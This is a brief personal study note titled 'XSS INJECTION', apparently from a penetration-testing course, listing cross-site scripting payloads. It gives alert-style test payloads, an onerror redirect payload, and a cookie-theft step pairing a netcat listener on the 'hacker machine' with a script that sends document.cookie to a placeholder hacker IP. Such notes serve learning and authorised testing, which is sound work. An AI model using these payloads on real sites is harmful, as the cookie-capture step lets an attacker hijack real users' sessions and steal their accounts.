---
title: XSS INJECTION
updated: 2023-10-04 13:37:35Z
created: 2023-10-02 12:12:57Z
latitude: -35.28093680
longitude: 149.13000920
altitude: 0.0000
---

# XSS INJECTION

1.  If you can enter a note, try:  
    `<script>prompt(1)</script>`  
    `<img src=x onerror="prompt(1)">`

2. Use a redirect:
`<img src=x onerror="location.href='https://tcm-sec.com'">`

3. Capture a cookie:
On hacker machine: `nc -lnvp 4444`
`<script>new Image().src='http://<hacker IP>:4444/?cookie=' + encodeURI(document.cookie);</script>`